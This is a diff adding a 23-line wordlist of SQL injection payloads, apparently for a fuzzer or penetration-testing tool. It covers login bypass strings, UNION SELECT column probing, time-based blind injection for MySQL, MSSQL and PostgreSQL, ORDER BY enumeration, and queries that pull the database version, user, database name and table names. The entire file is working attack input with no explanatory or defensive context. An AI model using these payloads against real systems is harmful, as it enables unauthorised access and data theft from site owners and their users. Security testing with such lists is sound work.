@@ -1,0 +1,23 @@
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR '1'='1'#
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+admin'--
+admin' #
+admin'/*
+') OR ('1'='1
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '00:00:05'--
+'; SELECT pg_sleep(5)--
+' AND 1=1--
+' AND 1=2--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+' UNION SELECT @@version--
+' UNION SELECT user()--
+' UNION SELECT database()--
+' UNION SELECT table_name FROM information_schema.tables--
